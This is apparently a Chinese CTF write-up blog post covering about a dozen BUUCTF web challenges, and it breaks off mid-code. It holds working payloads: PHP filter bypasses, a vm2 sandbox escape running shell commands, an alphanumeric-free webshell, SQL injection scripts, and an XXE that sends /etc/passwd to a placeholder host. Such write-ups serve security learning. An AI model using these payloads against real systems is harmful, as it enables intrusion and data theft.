---
title: "BUUCTF Web Writeup 7"
date: 2022-11-11T22:28:03+08:00
lastmod: 2022-11-11T22:28:03+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录…

<!--more-->

## [BJDCTF2020]EzPHP

右键注释 base32

```php
<?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
```

`$_SERVER['QUERY_STRING']` 的特性是不会 urldeode, 而 `$_GET` 会进行 urldecode, 因此可以双重编码绕过

`$_REQUEST` 优先解析 `$_POST` 内容, 其实还是看配置文件, 默认情况下先解析了 `$_GET`, 只不过是后来解析的 `$_POST` 把前面的给覆盖掉了

`preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute')` 这句可以在末尾加上 `%0a` 绕过, 因为单行模式下 `$` 不匹配换行符

`file_get_contents` 和 sha1 的绕过就不说了, 很简单

`preg_match('/^[a-z0-9]*$/isD', $code)` 用根命名空间绕过, 例如 `\create_function`

最后的正则里面没有 require (system 也没有, 但好像是被禁用了), 于是通过 require + 伪协议配合取反字符串绕过

`$code('', $arg);` 就是 `create_function` 的形式, 可以闭合大括号来执行任意代码

payload 如下

```php
get: debu=aqua_is_cute
&file=data://text/plain,debu_debu_aqua&shana[]=1&passwd[]=2&flag[code]=\create_function&flag[arg]=return 0;}require(~%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f);//

post: debu=123&file=123
```

其中 get 要把字母部分 urlencode, 即

```php
%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67[%63%6f%64%65]=%5c%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&%66%6c%61%67[%61%72%67]=%72%65%74%75%72%6e+0;}%72%65%71%75%69%72%65(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%99%93%9E%98%D1%8F%97%8F);//
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031153793.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031153820.png)

## [HFCTF2020]JustEscape

nodejs vm2 沙箱绕过

通过 `Error().stack` 可以看到路径为 `/app/node_modules/vm2/`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211091611183.png)

去学了一会 nodejs 安全, 参考文章如下

[http://thnpkm.xyz/index.php/archives/68/](http://thnpkm.xyz/index.php/archives/68/)

[https://bycsec.top/2020/04/20/Nodejs的一些技巧/](https://bycsec.top/2020/04/20/Nodejs的一些技巧/)

[https://xz.aliyun.com/t/7184](https://xz.aliyun.com/t/7184)

[https://xz.aliyun.com/t/11791](https://xz.aliyun.com/t/11791)

[https://xz.aliyun.com/t/7752](https://xz.aliyun.com/t/7752)

沙箱逃逸基本都是参照 GitHub 的 issue

[https://github.com/patriksimek/vm2/issues?q=breakout](https://github.com/patriksimek/vm2/issues?q=breakout)

随便找一个 [https://github.com/patriksimek/vm2/issues/225](https://github.com/patriksimek/vm2/issues/225)

然后发现程序 ban 了常用的关键词, 例如 eval process fs 单双引号这些

但是 nodejs 的语法很灵活, 字母可以通过 unicode / hex 转换来绕过, 单双引号可以用反引号代替

原 payload

```javascript
(function(){
	TypeError.prototype.get_process = f=>f.constructor("return process")();
	try{
		Object.preventExtensions(Buffer.from("")).a = 1;
	}catch(e){
		return e.get_process(()=>{}).mainModule.require("child_process").execSync("cat /flag").toString();
	}
})()
```

>  形如 `(function(){})` 或 `(function(){})()` 的表达式被称为 IIFE (立即调用函数表达式), 指函数在被定义之后就会立即执行

转 unicode, 之后再用 eval 配合 unicode 来构造

```javascript
\u0065val(`\u0028\u0066\u0075\u006e\u0063\u0074\u0069\u006f\u006e\u0028\u0029\u007b\u000a\u0009\u0054\u0079\u0070\u0065\u0045\u0072\u0072\u006f\u0072\u002e\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065\u002e\u0067\u0065\u0074\u005f\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u0020\u003d\u0020\u0066\u003d\u003e\u0066\u002e\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072\u0028\u0022\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u0022\u0029\u0028\u0029\u003b\u000a\u0009\u0074\u0072\u0079\u007b\u000a\u0009\u0009\u004f\u0062\u006a\u0065\u0063\u0074\u002e\u0070\u0072\u0065\u0076\u0065\u006e\u0074\u0045\u0078\u0074\u0065\u006e\u0073\u0069\u006f\u006e\u0073\u0028\u0042\u0075\u0066\u0066\u0065\u0072\u002e\u0066\u0072\u006f\u006d\u0028\u0022\u0022\u0029\u0029\u002e\u0061\u0020\u003d\u0020\u0031\u003b\u000a\u0009\u007d\u0063\u0061\u0074\u0063\u0068\u0028\u0065\u0029\u007b\u000a\u0009\u0009\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0065\u002e\u0067\u0065\u0074\u005f\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u0028\u0028\u0029\u003d\u003e\u007b\u007d\u0029\u002e\u006d\u0061\u0069\u006e\u004d\u006f\u0064\u0075\u006c\u0065\u002e\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0028\u0022\u0063\u0068\u0069\u006c\u0064\u005f\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u0022\u0029\u002e\u0065\u0078\u0065\u0063\u0053\u0079\u006e\u0063\u0028\u0022\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u0022\u0029\u002e\u0074\u006f\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u0029\u003b\u000a\u0009\u007d\u000a\u007d\u0029\u0028\u0029`)
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211091624244.png)

一些 wp 的做法是用模板拼接绕过, 这里给一个网上的 payload

```javascript
(function (){
    TypeError[`${`${`prototyp`}e`}`][`${`${`get_pro`}cess`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return proc`}ess`}`)();
    try{
        Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_pro`}cess`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
    }
})()
```

还没搞懂是啥原理... 研究了一会发现以下两种方式都能够成功绕过

```javascript
`${`${`prototyp`}e`}`

`${`prototyp`}e`
```

另外用数组传参的形式同样也能绕过, 估计是 js 弱类型的锅

```javascript
code[]=......
```

## [网鼎杯 2020 半决赛]AliceWebsite

index.php

```php
<?php
$action = (isset($_GET['action']) ? $_GET['action'] : 'home.php');
if (file_exists($action)) {
    include $action;
} else {
    echo "File not found!";
}
?>
```

```
http://8b5c34ad-3966-4d22-8f82-978ee0b3af4e.node4.buuoj.cn:81/index.php?action=../../../flag
```

pearcmd.php 也能一把梭

## [GXYCTF2019]StrongestMind

计算加减乘除一千次得到 flag

没啥好说的, 用正则匹配一下然后写脚本就行

```python
import requests
import time
import re

s = requests.Session()
stack = []

url = 'http://a0d88148-9160-4523-8230-3f7b8371580c.node4.buuoj.cn:81/'
res = s.get(url)
res.encoding = "utf-8"
quiz = re.findall(r'<br>([0-9]+.*?[\+\-\*\/].*?[0-9]+)<br>', res.text)[0]
stack.append(quiz)

for i in range(1001):
    time.sleep(0.05)
    quiz = stack.pop()
    ans = eval(quiz)
    res = s.post(url, data={'answer': ans})
    res.encoding = "utf-8"
    print(res.text)
    quiz = re.findall(r'<br>([0-9]+.*?[\+\-\*\/].*?[0-9]+)<br>', res.text)[0]
    stack.append(quiz)
```

## [SUCTF 2018]GetShell

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211091801926.png)

fuzz 可用字符

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211091801923.png)

看到 `~` 感觉思路是取反, 但是用 `(~"xxx")()` 的形式会爆 500

于是换个思路, 挨个挨个构造字母

参考文章 [https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)

fuzz 字符

```php
<?php

$dicts = '当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候我知道此次出行的目的已经完成了我要开始收拾行李明天早上离开这里前几天有人问我大学四年结束了你也不说点什么乌云发生了一些事情所有人都缄默不言你也是一样吗你逃到南方难道不回家了吗当然要回家我只是想找到我要找的答案其实这次出来一趟很累晚上几乎是热汗淋漓回到住处厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨也去不走我身上任何一个毛孔里的热气好在旅社的生活用品一应俱全洗完澡后我爬到屋顶旅社是一个老别墅说起来也不算老比起隔壁一家旧中国时期的房子要豪华得多竖立在笔山顶上与厦门岛隔海相望站在屋顶向下看灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间依稀还可以看到熙熙攘攘的游客大概是夜晚渐深的缘故周围慢慢变得宁静下来我忘记白天在奔波什么直到站在这里的时候我才知道我寻找的答案并不在南方当然也不在北方北京的很多东西让我非常丧气包括自掘坟墓的中介和颐指气使的大人们北京也有很多东西让我喜欢我喜欢颐和园古色古香的玉澜堂我喜欢朝阳门那块永延帝祚的牌坊喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃但这些都不是我要的答案我也不知道我追随的是什么但想想百年后留下的又是什么想想就很可怕我曾经为了吃一碗臭豆腐坐着优步从上地到北海北兴冲冲地来到那个垂涎已久的豆腐摊前用急切又害羞的口吻对老板说来两份量的臭豆腐其实也只要块钱吃完以后便是无与伦比的满足感我记得那是毕业设计审核前夕的一个午后五月的北京还不算炎热和煦的阳光顺着路边老房子的屋檐洒向大地但我还是不敢站在阳光下春天的燥热难耐也绝不输给夏天就像很多人冷嘲热讽的那样做这一行谁敢把自己完全曝光甭管你是黑帽子白帽子还是绿帽子生活在那个时候还算美好我依旧是一个学生几天前辞别的同伴还在朝九晚五的工作一切都照旧运行波澜不惊远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生甚至南下此行也不例外一年前的这个时候我许过一个心愿在南普陀我特为此来还愿理想化单纯与恋旧其中单纯可不是一个多么令人称赞的形容很多人把他和傻挂钩你太单纯了你还想着这一切会好起来对呀在男欢女爱那些事情上我可不单纯但有些能让人变得圆滑与世故的抉择中我宁愿想的更单纯一些去年冬天孤身一人来到北京放弃了在腾讯做一个安逸的实习生的机会原因有很多也很难说在腾讯短暂的实习生活让我记忆犹新我感觉这辈子不会再像一个小孩一样被所有人宠了这些当我选择北漂的时候应该就要想到的北京的冬天刺骨的寒冷特别是年的腊月有几天连续下着暴雪路上的积雪一踩半步深咯吱咯吱响周遭却静的像深山里的古刹我住的小区离公司有一段距离才下雪的那天我甚至还走着回家北京的冬天最可怕的是寒风走到家里耳朵已经硬邦邦好像一碰就会碎在我一头扎进被窝里的时候我却慢慢喜欢上这个古都了我想到雍正皇帝里胤禛在北京的鹅毛大雪里放出十三爷那个拼命十三郎带着令牌取下丰台大营的兵权保了大清江山盛世的延续与稳固那一夜北京的漫天大雪绝不逊于今日而昔人已作古来者尚不能及多么悲哀这个古都承载着太多历史的厚重感特别是下雪的季节我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟屋檐上的积雪高高在上的鸱吻想到数百年的沧桑与朝代更迭雪停的那天我去了颐和园我记得我等了很久才摇摇摆摆来了一辆公交车车上几乎没有人司机小心翼翼地转动着方向盘在湿滑的道路上缓慢前行窗外白茫茫一片阳光照在雪地上有些刺眼我才低下头颐和园的学生票甚至比地铁票还便宜在昆明湖畔眺望湖面微微泛着夕阳霞光的湖水尚未结冰踩着那些可能被御碾轧过的土地滑了无数跤最后只能扶着湖边的石狮子叹气为什么没穿防滑的鞋子昆明湖这一汪清水见证了光绪皇帝被囚禁十载的蹉跎岁月见证了静安先生誓为先朝而自溺也见证了共和国以来固守与开放的交叠说起来家里有本卫琪著的人间词话典评本想买来瞻仰一下王静安的这篇古典美学巨著没想到全书多是以批判为主我自诩想当文人的黑客其实也只是嘴里说说真到评说文章是非的时候我却张口无词倒是誓死不去发这点确实让我无限感慨中国士大夫的骨气真的是从屈原投水的那一刻就奠定下来的有句话说古往今来中国三大天才死于水其一屈原其二李白其三王国维卫琪对此话颇有不服不纠结王国维是否能够与前二者相提并论我单喜欢他的直白能畅快评说古今词话的人也许无出其右了吧人言可畏人言可畏越到现代越会深深感觉到这句话的正确看到很多事情的发展往往被舆论所左右就越羡慕那些无所畏惧的人不论他们是勇敢还是自负此间人王垠算一个网络上人们对他毁誉参半但确实有本事而又不矫揉做作放胆直言心比天高的只有他一个了那天在昆明湖畔看过夕阳直到天空变的无比深邃我才慢慢往家的方向走耳机放着后弦的昆明湖不知不觉已经十年了不知道这时候他有没有回首望望自己的九公主和安娜是否还能够泼墨造一匹快马追回十年前姑娘后来感觉一切都步入正轨学位证也顺利拿到我匆匆告别了自己的大学后来也遇到了很多事事后有人找我很多人关心你少数人可能不是但出了学校以后又有多少人和事情完全没有目的呢我也考虑了很多去处但一直没有决断倒有念怀旧主也有妄自菲薄之意我希望自己能做出点成绩再去谈其他的所以很久都是闭门不出琢磨东西来到厦门我还了一个愿又许了新的愿望希望我还会再次来还愿我又来到了上次没住够的鼓浪屿订了一间安静的房子只有我一个人在这里能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声远处的喧嚣早已烟消云散即使这只是暂时的站在屋顶的我喝下杯中最后一口水清晨背着行李我乘轮渡离开了鼓浪屿这是我第二次来鼓浪屿谁知道会不会是最后一次我在这里住了三天用三天去寻找了一个答案不知不觉我又想到辜鸿铭与沈子培的那段对话大难临头何以为之世受国恩死生系之';

$s = '_GET';

for ($j = 0; $j < strlen($s); $j++){
    for ($i = 0; $i < mb_strlen($dicts, 'utf-8'); $i++){
        $t = mb_substr($dicts, $i, 1, 'utf-8');
        if ($s[$j] == ~($t[1])){
            echo "~($t{1})=".~($t[1]);
            echo "<br/>";
            break;
        }
    }
}

?>
```

这里好像必须得用 `mb_substr` 和 `mb_strlen` 才行

之后需要构造 `1`, 通过布尔运算可以知道 `[] == []` 的结果为 true, 转换成数字就是 `1`

最终 payload

```php
<?php
$__=[]==[];
$_=~((样)[$__]);
$_.=~((上)[$__]);
$_.=~((了)[$__]);
$_.=~((站)[$__]);
$$_[$__]($$_[$__.$__]);
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211091806903.png)

## October 2019 Twice SQL Injection

先注册再登录, username 处存在二次注入, 直接用 union 就行

payload

```python
import requests
import random
import re
import time

url = 'http://a4163eb7-4e58-4c87-aef7-ca1dd2331f37.node4.buuoj.cn:81'

s = requests.Session()

def register(sql):
    time.sleep(0.05)
    payload = "{}' union {} #".format(random.random(), sql)
    print(payload)
    data = {
    'username': payload,
    'password': '1'
    }
    res = s.post(url + '/?action=reg', data=data)
    return payload

def login(username):
    time.sleep(0.05)
    data = {
    'username': username,
    'password': '1'
    }
    res = s.post(url + '/?action=login', data=data)
    result = re.findall(r'<div>(.+?)<\/div>', res.text)[0]
    print(result)


login(register('select flag from flag'))
```

## [b01lers2020]Life on Mars

/static/js/life\_on\_mars.js

```javascript
function get_life(query) {
  $.ajax({
    type: "GET",
    url: "/query?search=" + query,
    data: "{}",
    contentType: "application/json; charset=utf-8",
    dataType: "json",
    cache: false,
    success: function(data) {
      var table_html =
        '<table id="results"><tr><th>Name</th><th>Description</th></tr>';
      $.each(data, function(i, item) {
        table_html +=
          "<tr><td>" + data[i][0] + "</td><td>" + data[i][1] + "</td></tr>";
      });
      table_html += "</table>";

      $("#results").replaceWith(table_html);
    },

    error: function(msg) { }
  });
}
```

感觉是注入, 但是试了好多 payload 都不行, 最后才发现竟然不用闭合引号???

```
http://ce02e88b-d616-4110-b003-ac96d4b4ece2.node4.buuoj.cn:81/query?search=amazonis_planitia union select 1,group_concat(code) from alien_code.code
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211091855046.png)



## [GKCTF 2021]easycms

蝉知 cms 7.7, 后台 admin.php

用 admin/12345 弱口令成功登录

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101901206.png)

模板处可以插 shell, 但是要验证权限

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101902684.png)

翻了一会在设置里看到了这个选项

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101903263.png)

取消勾选会也会验证权限, 但是勾选 "密保问题验证" 就不会...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101904494.png)

然后去更改密保问题, 翻了半天才发现在左下角

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101904953.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101905079.png)

之后去更改模板, 还是会验证文件...

看了 wp 才知道需要先点添加用户来激活这个选项

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101907269.png)

之后编辑模板, 插入 php 代码, 最后查看 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101914522.png)

网页有缓存, 记得把访问路径改一改

wp 的另一种解法是利用微信上传二维码来创建验证权限的文件, 这里就不写了

## [MRCTF2020]Ezaudit

www.zip 解压得到 index.php

```php
<?php 
header('Content-type:text/html; charset=utf-8');
error_reporting(0);
if(isset($_POST['login'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $Private_key = $_POST['Private_key'];
    if (($username == '') || ($password == '') ||($Private_key == '')) {
        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header('refresh:2; url=login.html');
        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
        exit;
}
    else if($Private_key != '*************' )
    {
        header('refresh:2; url=login.html');
        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
        exit;
    }

    else{
        if($Private_key === '************'){
        $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; 
        $link=mysql_connect("localhost","root","root");
        mysql_select_db("test",$link);
        $result = mysql_query($getuser);
        while($row=mysql_fetch_assoc($result)){
            echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
        }
    }
    }

} 
// genarate public_key 
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  }

  //genarate private_key
  function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
  $Public_key = public_key();
  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
```

一眼伪随机数

先生成所需参数

```python
d = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
c = 'KVQP0LdJKRaV3n9D'

output = ''

for s in c:
    output += str(d.index(s)) + ' ' + str(d.index(s)) + ' 0 61 '
print(output)
```

爆破

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101604712.png)

payload

```php
<?php

mt_srand(1775196155);

function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  }

  //genarate private_key
  function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
echo public_key();
echo "<br/>";
echo private_key();
```

登录

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101604572.png)

## [极客大挑战 2020]Roamphp1-Welcome

get 会 405, 传 post

```php
<?php
error_reporting(0);
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
header("HTTP/1.1 405 Method Not Allowed");
exit();
} else {
    
    if (!isset($_POST['roam1']) || !isset($_POST['roam2'])){
        show_source(__FILE__);
    }
    else if ($_POST['roam1'] !== $_POST['roam2'] && sha1($_POST['roam1']) === sha1($_POST['roam2'])){
        phpinfo();  // collect information from phpinfo!
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211101848060.png)

## [CSAWQual 2019]Web_Unagi

常规 xxe, 存在 waf, 过滤了 ENTITY SYSTEM file 等关键词

参考文章 [https://xz.aliyun.com/t/4059](https://xz.aliyun.com/t/4059)

这里利用 utf-16be 绕过

打了之后发现回显位置有长度限制, 于是改成远程回显

payload 如下

```xml
?>
<!DOCTYPE test [
<!ENTITY % remote SYSTEM "http://ip:port/evil.dtd">
%remote;%int;%send;
]>
<users>
<user>
<username>alice</username>
<password>passwd1</password>
<name>alice</name>
<email>alice@fakesite.com</email>
<group>CSAW2019</group>
</user>
<user>
<username>bob</username>
<password>passwd2</password>
<name> Bob</name>
<email>bob@fakesite.com</email>
<group>CSAW2019</group>
</user>
</users>

```

evil.dtd

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://ip:port/?output=%file;'>">
```

转换为 utf-16be

```bash
printf '%s' '<?xml version="1.0" encoding="UTF-16BE"' > test1.xml
cat test.xml | iconv -f utf-8 -t utf-16be >> test1.xml
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211102043838.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211102044149.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211102044422.png)

另外也能用双重实体编码绕过, 参考 [https://wiki.wgpsec.org/knowledge/ctf/xxe.html](https://wiki.wgpsec.org/knowledge/ctf/xxe.html)

## [GYCTF2020]Easyphp

www.zip 源码泄露

index.php

```php
<?php
require_once "lib.php";

if(isset($_GET['action'])){
	require_once(__DIR__."/".$_GET['action'].".php");
}
else{
	if($_SESSION['login']==1){
		echo "<script>window.location.href='./index.php?action=update'</script>";
	}
	else{
		echo "<script>window.location.href='./index.php?action=login'</script>";
	}
}
?>
```

lib.php

```php
<?php
error_reporting(0);
session_start();
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
class User
{
    public $id;
    public $age=null;
    public $nickname=null;
    public function login() {
        if(isset($_POST['username'])&&isset($_POST['password'])){
        $mysqli=new dbCtrl();
        $this->id=$mysqli->login('select id,password from user where username=?');
        if($this->id){
        $_SESSION['id']=$this->id;
        $_SESSION['login']=1;
        echo "你的ID是".$_SESSION['id'];
        echo "你好！".$_SESSION['token'];
        echo "<script>window.location.href='./update.php'</script>";
        return $this->id;
        }
    }
}
    public function update(){
        $Info=unserialize($this->getNewinfo());
        $age=$Info->age;
        $nickname=$Info->nickname;
        $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
        //这个功能还没有写完 先占坑
    }
    public function getNewInfo(){
        $age=$_POST['age'];
        $nickname=$_POST['nickname'];
        return safe(serialize(new Info($age,$nickname)));
    }
    public function __destruct(){
        return file_get_contents($this->nickname);//危
    }
    public function __toString()
    {
        $this->nickname->update($this->age);
        return "0-0";
    }
}
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname){
        $this->age=$age;
        $this->nickname=$nickname;
    }
    public function __call($name,$argument){
        echo $this->CtrlCase->login($argument[0]);
    }
}
Class UpdateHelper{
    public $id;
    public $newinfo;
    public $sql;
    public function __construct($newInfo,$sql){
        $newInfo=unserialize($newInfo);
        $upDate=new dbCtrl();
    }
    public function __destruct()
    {
        echo $this->sql;
    }
}
class dbCtrl
{
    public $hostname="127.0.0.1";
    public $dbuser="root";
    public $dbpass="root";
    public $database="test";
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct()
    {
        $this->name=$_POST['username'];
        $this->password=$_POST['password'];
        $this->token=$_SESSION['token'];
    }
    public function login($sql)
    {
        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
        if ($this->mysqli->connect_error) {
            die("连接失败，错误:" . $this->mysqli->connect_error);
        }
        $result=$this->mysqli->prepare($sql);
        $result->bind_param('s', $this->name);
        $result->execute();
        $result->bind_result($idResult, $passwordResult);
        $result->fetch();
        $result->close();
        if ($this->token=='admin') {
            return $idResult;
        }
        if (!$idResult) {
            echo('用户不存在!');
            return false;
        }
        if (md5($this->password)!==$passwordResult) {
            echo('密码错误！');
            return false;
        }
        $_SESSION['token']=$this->name;
        return $idResult;
    }
    public function update($sql)
    {
        //还没来得及写
    }
}
```

login.php

```php
<?php
require_once('lib.php');
?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
<title>login</title>
<center>
	<form action="login.php" method="post" style="margin-top: 300">
		<h2>百万前端的用户信息管理系统</h2>
		<h3>半成品系统 留后门的程序员已经跑路</h3>
        		<input type="text" name="username" placeholder="UserName" required>
		<br>
		<input type="password" style="margin-top: 20" name="password" placeholder="password" required>
		<br>
		<button style="margin-top:20;" type="submit">登录</button>
		<br>
		<img src='img/1.jpg'>大家记得做好防护</img>
		<br>
		<br>
<?php 
$user=new user();
if(isset($_POST['username'])){
	if(preg_match("/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i", $_POST['username'])){
		die("<br>Damn you, hacker!");
	}
	if(preg_match("/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i", $_POST['password'])){
		die("Damn you, hacker!");
	}
	$user->login();
}
?>
	</form>
</center>
```

update.php

```php
<?php
require_once('lib.php');
echo '<html>
<meta charset="utf-8">
<title>update</title>
<h2>这是一个未完成的页面，上线时建议删除本页面</h2>
</html>';
if ($_SESSION['login']!=1){
	echo "你还没有登陆呢！";
}
$users=new User();
$users->update();
if($_SESSION['login']===1){
	require_once("flag.php");
	echo $flag;
}

?>
```

User 类的 update 会反序列化 getNewInfo() 返回的内容, 而后者内部会将序列化之后的数据用 safe 函数替换, 所以存在反序列化逃逸

然后根据剩下的几个类来构造 pop 链, 最终调用到 `dbCtrl->login($sql)` 来执行任意 sql 语句, 这里直接更改了 admin 的密码

payload

```php
<?php

class User
{
    public $id;
    public $age=null;
    public $nickname=null;

}
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;

}
Class UpdateHelper{
    public $id;
    public $newinfo;
    public $sql;

}
class dbCtrl
{
    public $hostname="127.0.0.1";
